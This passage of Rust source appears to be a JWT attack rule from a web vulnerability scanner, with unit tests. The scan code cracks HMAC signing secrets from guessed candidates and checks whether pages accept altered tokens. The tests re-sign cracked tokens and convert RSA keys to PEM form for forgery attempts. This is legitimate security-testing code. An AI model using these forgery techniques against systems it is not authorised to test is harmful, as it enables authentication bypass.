    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Page
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            let request = cx.base_request().to_vec();
            let text = String::from_utf8_lossy(&request).to_string();
            let tokens = found(cx, &text);
            let origin = cx.target().origin();
            for found in &tokens {
                let jwt = &found.jwt;
                if cx.stopped() {
                    return;
                }
                let (place, keep) = locate(cx, &request, &found.from);
                let key = format!("100007|{origin}|{place}|{}|{}", jwt.alg(), jwt.kid().unwrap_or(""));
                // Offline: the secret, once per origin, place and key.
                let mut secret = None;
                if hmac_alg(jwt.alg()).is_some() {
                    secret = crack(jwt, &candidates(&cx.target().host));
                    if let Some(s) = &secret {
                        if cx.once(&format!("{key}|secret")) {
                            let shown = if s.is_empty() {
                                "an empty secret".to_string()
                            } else {
                                format!("the secret \"{s}\"")
                            };
                            let other = format!("The {} signature verifies with {shown}.", jwt.alg());
                            let evidence = if found.hidden { String::new() } else { jwt.raw.clone() };
                            cx.report(WEAK_SECRET.raise(place.clone(), evidence).other_info(other), cx.base_response());
                        }
                    }
                }
                if !(0..tries(cx.strength())).any(|i| cx.once(&format!("{key}|try{i}"))) {
                    continue;
                }
                // Does this page depend on the token? The real token against none at all.
                let Ok(real) = cx.send_keeping(request.clone(), &keep).await else { continue };
                let Ok(absent) = cx.send_keeping(found.request(&request, ""), &keep).await else {
                    continue;
                };
                // A refused real token (it expired since it was recorded, say) would make every forged
                // one look accepted.
                if real.status >= 400 || same(&real, &absent) || !cx.once(&format!("{key}|attacked")) {
                    continue;
                }
                let keep = std::sync::Mutex::new(keep);
                let probe = Probe { cx, request: &request, found, jwt, keep, place, real, absent };
                probe.run(secret.as_deref()).await;
            }
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // {"alg":"HS256","typ":"JWT"} {"sub":"1234567890","name":"John Doe","iat":1516239022}, secret
    // "your-256-bit-secret" (jwt.io's example).
    const IO: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

    #[test]
    fn parses_and_cracks_the_jwt_io_example() {
        let jwt = Jwt::parse(IO).unwrap();
        assert_eq!(jwt.alg(), "HS256");
        assert_eq!(jwt.payload.get("sub").and_then(Value::as_str), Some("1234567890"));
        assert_eq!(crack(&jwt, &candidates("app.example.com")).as_deref(), Some("your-256-bit-secret"));
        assert_eq!(crack(&jwt, &["nope".to_string()]), None);
    }

    #[test]
    fn signs_what_it_cracks() {
        let jwt = Jwt::parse(IO).unwrap();
        let again = sign(hmac::HMAC_SHA256, b"your-256-bit-secret", &jwt.header, &jwt.payload_b64);
        assert_eq!(again, IO);
    }

    #[test]
    fn host_names_are_candidates() {
        let c = candidates("api.acme.io");
        assert!(c.contains(&"acme".to_string()) && c.contains(&"acme-secret".to_string()));
        assert!(c.contains(&"acme.io".to_string()) && c.contains(&String::new()));
        assert!(!candidates("10.0.0.1").contains(&"0".to_string()) || SECRETS.lines().any(|l| l == "0"));
    }

    #[test]
    fn rejects_what_isnt_a_jwt() {
        assert!(Jwt::parse("eyJhIjoxfQ.eyJiIjoyfQ.").is_none(), "no alg");
        assert!(Jwt::parse("a.b.c.d").is_none());
        assert!(Jwt::parse("eyJhbGciOiJub25lIn0.eyJzdWIiOiJ4In0.").is_some());
    }

    #[test]
    fn rsa_jwk_becomes_spki_pem() {
        // e = 65537, n = a 9-byte value with its high bit set (gets a leading zero).
        let mut jwk = Map::new();
        jwk.insert("kty".into(), "RSA".into());
        jwk.insert("e".into(), "AQAB".into());
        jwk.insert("n".into(), URL_SAFE_NO_PAD.encode([0x80, 1, 2, 3, 4, 5, 6, 7, 8]).into());
        let pems = rsa_pems(&jwk);
        assert_eq!(pems.len(), 4);
        assert!(pems[0].starts_with("-----BEGIN PUBLIC KEY-----\n") && pems[0].ends_with("-----\n"));
        assert!(!pems[1].ends_with('\n'));
        let b64: String = pems[1].lines().filter(|l| !l.starts_with("-----")).collect();
        let der_bytes = STANDARD.decode(b64).unwrap();
        // SEQUENCE { AlgorithmIdentifier, BIT STRING { SEQUENCE { INTEGER n, INTEGER e } } }
        let pkcs1 = [0x30, 0x11, 0x02, 0x0a, 0x00, 0x80, 1, 2, 3, 4, 5, 6, 7, 8, 0x02, 0x03, 1, 0, 1];
        let mut want =
            vec![0x30, 0x25, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00];
        want.extend([0x03, 0x14, 0x00]);
        want.extend(pkcs1);
        assert_eq!(der_bytes, want);
        assert!(pems[2].starts_with("-----BEGIN RSA PUBLIC KEY-----"));
    }

    #[test]
    fn finds_pem_keys_as_files_and_json_hold_them() {
        let file =
            "-----BEGIN RSA PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEB\nAQUAA4GNADCBiQ==\n-----END RSA PUBLIC KEY-----";
        assert_eq!(pems_in(file), vec![vec![file.to_string(), format!("{file}\n")]]);
        let json = serde_json::json!({ "key": file }).to_string();
        assert!(json.contains("\\n"), "{json}");
        assert_eq!(pems_in(&json), pems_in(file));
        assert!(pems_in("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----").is_empty());
    }

    #[test]
    fn key_links_stay_on_the_origin() {
        let o = "http://a.test";
        assert_eq!(same_origin_path("jwt.pub", "/encryptionkeys/", o).as_deref(), Some("/encryptionkeys/jwt.pub"));
        assert_eq!(same_origin_path("./k.pem", "/a/b.html", o).as_deref(), Some("/a/k.pem"));
        assert_eq!(same_origin_path("/k.pem", "/a/b", o).as_deref(), Some("/k.pem"));
        assert_eq!(same_origin_path("http://a.test/x/k.pem", "/", o).as_deref(), Some("/x/k.pem"));
        assert_eq!(same_origin_path("https://b.test/k.pem", "/", o), None);
        assert_eq!(same_origin_path("//b.test/k.pem", "/", o), None);
        assert_eq!(same_origin_path("../k.pem", "/a/", o), None);
        let page = r#"<a href="jwt.pub">jwt.pub</a> <a href="premium.key">k</a> <script src='/k.pem'>"#;
        let links: Vec<&str> = KEY_LINK.captures_iter(page).filter_map(|c| c.get(1)).map(|m| m.as_str()).collect();
        assert_eq!(links, ["jwt.pub", "/k.pem"]);
    }

    #[test]
    fn long_der_lengths() {
        assert_eq!(der_len(0x7f), vec![0x7f]);
        assert_eq!(der_len(0x80), vec![0x81, 0x80]);
        assert_eq!(der_len(0x1234), vec![0x82, 0x12, 0x34]);
    }

    #[test]
    fn replaces_the_token_and_fixes_the_length() {
        let req = b"POST /a HTTP/1.1\r\nHost: x\r\nContent-Length: 9\r\n\r\ntoken=abc".to_vec();
        let out = String::from_utf8(with_token(&req, "abc", "abcdef")).unwrap();
        assert!(out.contains("Content-Length: 12") && out.ends_with("token=abcdef"));
    }
}
